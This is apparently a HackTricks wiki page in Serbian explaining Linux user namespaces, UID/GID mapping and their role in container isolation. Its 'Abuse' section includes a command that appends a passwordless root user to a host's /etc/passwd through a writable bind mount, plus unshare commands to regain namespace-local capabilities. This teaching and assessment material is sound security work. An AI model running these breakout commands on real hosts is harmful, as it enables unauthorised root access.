# Korisnički namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## Pregled

Korisnički namespace menja značenje user i group ID-ova tako što omogućava kernelu da mapira ID-eve vidljive unutar namespace-a na različite ID-eve van njega. Ovo je jedna od najvažnijih modernih zaštita za kontejnere jer direktno rešava najveći istorijski problem klasičnih kontejnera: **root unutar kontejnera je bio neprijatno blizu root-a na hostu**.

Sa korisničkim namespace-ima, proces može da se pokrene kao UID 0 unutar kontejnera, a ipak odgovarati neprivilegovanom opsegu UID-ova na hostu. To znači da se proces može ponašati kao root za mnoge zadatke unutar kontejnera, dok je sa stanovišta hosta znatno manje moćan. Ovo ne rešava svaki sigurnosni problem kontejnera, ali značajno menja posledice kompromitovanja kontejnera.

## Funkcionisanje

Korisnički namespace ima mapirajuće fajlove kao što su `/proc/self/uid_map` i `/proc/self/gid_map` koji opisuju kako se namespace ID-evi prevode u roditeljske ID-eve. Ako se root unutar namespace-a mapira na neprivilegovan host UID, operacije koje bi zahtevale stvarni host root jednostavno nemaju istu težinu. Zato su user namespaces centralni za **rootless containers** i zašto su jedan od najvećih razlika između starijih rootful container default-a i modernijih dizajna zasnovanih na principu najmanjih privilegija.

Suština je suptilna ali ključna: root unutar kontejnera nije uklonjen, već je **preveden**. Proces i dalje doživljava root-sličan (root-like) okolinu lokalno, ali host ne bi trebalo da ga tretira kao punog root-a.

## Lab

Manuelni test je:
```bash
unshare --user --map-root-user --fork bash
id
cat /proc/self/uid_map
cat /proc/self/gid_map
```
Ovo čini da trenutni korisnik izgleda kao root unutar namespace-a, dok i dalje nije host root izvan njega. To je jedan od najboljih jednostavnih primera za razumevanje zašto su user namespaces toliko vredne.

U containers, možete uporediti vidljivo mapiranje sa:
```bash
docker run --rm debian:stable-slim sh -c 'id && cat /proc/self/uid_map'
```
Tačan izlaz zavisi od toga da li engine koristi user namespace remapping ili tradicionalniju rootful konfiguraciju.

Takođe možete pročitati mapiranje sa host strane pomoću:
```bash
cat /proc/<pid>/uid_map
cat /proc/<pid>/gid_map
```
## Korišćenje u runtime-u

Rootless Podman je jedan od najočiglednijih primera u kojima se user namespaces tretiraju kao sigurnosni mehanizam prvog reda. Rootless Docker takođe zavisi od njih. Docker-ova userns-remap podrška poboljšava bezbednost i u rootful daemon deployments, mada su ih istorijski mnogi deploymenti ostavljali onemogućenim iz razloga kompatibilnosti. Kubernetes podrška za user namespaces se poboljšala, ali usvajanje i podrazumevana podešavanja variraju po runtime-u, distro-u i politici klastera. Incus/LXC sistemi takođe se u velikoj meri oslanjaju na UID/GID shifting i idmapping ideje.

Opšti trend je jasan: okruženja koja ozbiljno koriste user namespaces obično daju bolji odgovor na pitanje "what does container root actually mean?" nego okruženja koja to ne čine.

## Napredni detalji mapiranja

Kada neprivilegovan proces upisuje u `uid_map` ili `gid_map`, kernel primenjuje stroža pravila nego za privilegovanog pisca u roditeljskom namespace-u. Dozvoljena su samo ograničena mapiranja, i za `gid_map` pisac obično mora prvo da onemogući `setgroups(2)`:
```bash
cat /proc/self/setgroups
echo deny > /proc/self/setgroups
```
Ovaj detalj je važan jer objašnjava zašto user-namespace podešavanje ponekad ne uspeva u rootless eksperimentima i zašto runtimes zahtevaju pažljivu pomoćnu logiku oko delegiranja UID/GID.

Još jedna napredna funkcija je **ID-mapped mount**. Umesto menjanja vlasništva na disku, ID-mapped mount primenjuje user-namespace mapiranje na mount tako da vlasništvo izgleda prevedeno kroz taj mount prikaz. To je posebno relevantno u rootless i modernim runtime podešavanjima jer omogućava upotrebu deljenih host path-ova bez rekurzivnog `chown` operacija. Sa stanovišta bezbednosti, ova funkcija menja kako writable a bind mount izgleda iz unutrašnjosti namespace-a, iako ne prepisuje osnovne metapodatke fajl sistema.

Na kraju, imajte na umu da kada proces kreira ili uđe u novi user namespace, on dobija kompletan skup capabilities unutar tog namespace-a. To ne znači da je iznenada stekao host-global moć. To znači da se te capabilities mogu koristiti samo tamo gde to dozvoljava namespace model i druge zaštite. Zato `unshare -U` može iznenada omogućiti mount-ovanje ili privilegovane operacije lokalne za namespace bez toga da se direktno ukloni host root granica.

## Neispravne konfiguracije

Glavna slabost je jednostavno neupotreba user namespaces u okruženjima gde bi bile izvodljive. Ako container root mapira previše direktno na host root, writable host mounts i privilegovane kernel operacije postaju znatno opasnije. Drugi problem je forsiranje deljenja host user namespace-a ili onemogućavanje remapping-a radi kompatibilnosti, bez sagledavanja koliko to menja granicu poverenja.

User namespaces takođe treba razmatrati zajedno sa ostatkom modela. Čak i kada su aktivne, široko izlaganje runtime API-ja ili veoma slaba runtime konfiguracija i dalje mogu omogućiti privilege escalation putem drugih puteva. Ali bez njih, mnoge stare klase breakout-a postaju mnogo lakše za eksploatisanje.

## Zloupotreba

Ako je container rootful bez odvajanja user namespace-a, writable host bind mount postaje znatno opasniji jer proces zaista može pisati kao host root. Opasne capabilities takođe postaju značajnije. Napadač više ne mora toliko da se bori protiv granice translacije jer ta granica skoro da i ne postoji.

Prisustvo ili odsustvo user namespace-a treba proveriti rano prilikom procene puta za container breakout. To ne daje odgovore na sva pitanja, ali odmah pokazuje da li "root in container" ima direktnu relevantnost za host.

Najpraktičniji obrazac zloupotrebe je potvrditi mapiranje i zatim odmah testirati da li je host-mounted sadržaj upisiv sa privilegijama relevantnim za host:
```bash
id
cat /proc/self/uid_map
cat /proc/self/gid_map
touch /host/tmp/userns_test 2>/dev/null && echo "host write works"
ls -ln /host/tmp/userns_test 2>/dev/null
```
Ako je fajl kreiran kao stvarni host root, user namespace izolacija je efektivno odsutna za tu putanju. U tom trenutku, klasične host-file zloupotrebe postaju realistične:
```bash
echo 'x:x:0:0:x:/root:/bin/bash' >> /host/etc/passwd 2>/dev/null || echo "passwd write blocked"
cat /host/etc/passwd | tail
```
Sigurnija potvrda tokom procene uživo je upisivanje benignog markera umesto menjanja kritičnih fajlova:
```bash
echo test > /host/root/userns_marker 2>/dev/null
ls -l /host/root/userns_marker 2>/dev/null
```
Ove provere su važne jer brzo odgovaraju na stvarno pitanje: da li root u ovom containeru mapira dovoljno blizu host root-a tako da writable host mount odmah postaje put do kompromitovanja hosta?

### Potpun primer: Povraćaj namespace-lokalnih capabilities

Ako seccomp dozvoljava `unshare` i okruženje omogućava novi user namespace, proces može povratити kompletan skup capabilities unutar tog novog namespace-a:
```bash
unshare -UrmCpf bash
grep CapEff /proc/self/status
mount -t tmpfs tmpfs /mnt 2>/dev/null && echo "namespace-local mount works"
```
Ovo samo po sebi nije host escape. Važno je zato što user namespaces mogu ponovo omogućiti privilegovane namespace-lokalne akcije koje se kasnije kombinuju sa slabim mount-ovima, ranjivim kernelima ili loše izloženim runtime površinama.

## Provere

Ove komande služe da odgovore na najvažnije pitanje na ovoj stranici: na šta se root unutar ovog kontejnera preslikava na hostu?
```bash
readlink /proc/self/ns/user   # User namespace identifier
id                            # Current UID/GID as seen inside the container
cat /proc/self/uid_map        # UID translation to parent namespace
cat /proc/self/gid_map        # GID translation to parent namespace
cat /proc/self/setgroups 2>/dev/null   # GID-mapping restrictions for unprivileged writers
```
Šta je ovde interesantno:

- Ako je proces UID 0 i mape pokazuju direktno ili veoma blisko mapiranje na host root, kontejner je mnogo opasniji.
- Ako se root mapira na neprivilegovani opseg na hostu, to je znatno sigurnija osnova i obično ukazuje na pravu user namespace izolaciju.
- Fajlovi mapiranja vredniji su od samog `id`, jer `id` prikazuje samo identitet unutar namespace-a.

Ako workload radi kao UID 0 i mapiranje pokazuje da to odgovara blisko host root-u, trebalo bi da tumačite preostale privilegije kontejnera mnogo strožije.
